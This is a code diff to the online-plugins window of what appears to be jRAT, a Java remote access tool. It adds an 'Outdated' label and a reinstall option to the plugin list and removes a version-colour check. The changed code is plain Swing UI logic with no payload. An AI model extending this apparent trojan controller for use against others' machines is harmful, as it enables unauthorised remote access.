@@ -33,9 +33,10 @@ import javax.swing.table.DefaultTableModel;
 
 import pro.jrat.Constants;
 import pro.jrat.ErrorDialog;
-import pro.jrat.common.Version;
 import pro.jrat.extensions.ExtensionInstaller;
 import pro.jrat.extensions.OnlinePlugin;
+import pro.jrat.extensions.Plugin;
+import pro.jrat.extensions.PluginLoader;
 import pro.jrat.listeners.ExtensionInstallerListener;
 import pro.jrat.net.WebRequest;
 
@@ -93,23 +94,25 @@ public class FrameOnlinePlugins extends JFrame {
 				JLabel lbl = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
 
 				OnlinePlugin plugin = getPlugin((String) table.getValueAt(row, 0));
-				
-				if (plugin.getBuiltFor().substring(0, 3).equals(Version.getVersion().substring(0, 3))) {
-					setForeground(isSelected ? Color.white : Color.green.darker());
-				} else {
-					setForeground(isSelected ? Color.white : Color.black);
-				}
 
 				if (column == 0 && plugin != null) {
 					lbl.setIcon(plugin.getIcon());
+					
+					if (plugin.isInstalled()) {
+						Plugin realPlugin = PluginLoader.getPlugin(plugin.getDisplayName());
+			
+						if (realPlugin != null && !plugin.getVersion().equals(realPlugin.getVersion())) {
+							setText("(Outdated) " + value);
+						}
+					}
 				} else if (column == 5) {
 					if (plugin == null) {
 						JButton btn = new JButton("?");
 						btn.setEnabled(false);
 						return btn;
 					} else {
-						JButton btn = new JButton(plugin.isInstalled() ? "Installed" : "Install");
-						btn.setEnabled(!plugin.isInstalled());
+						JButton btn = new JButton(plugin.isInstalled() ? "Reinstall" : "Install");
+						//btn.setEnabled(!plugin.isInstalled());
 						return btn;
 					}
 				} else {
@@ -201,11 +204,7 @@ public class FrameOnlinePlugins extends JFrame {
 	}
 	
 	public void install(final OnlinePlugin plugin) {
-		if (plugin.isInstalled()) {
-			return;
-		}
-		
-		String what = plugin.isInstalled() ? "uninstall" : "install";
+		String what = plugin.isInstalled() ? "reinstall" : "install";
 		if (JOptionPane.showConfirmDialog(null, "Are you sure that you want to " + what + " " + plugin.getDisplayName() + "?\n\njRAT Project is not behind many of these plugins and cannot verify their content", "Plugin", JOptionPane.YES_NO_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE) != JOptionPane.YES_OPTION) {
 			return;
 		}
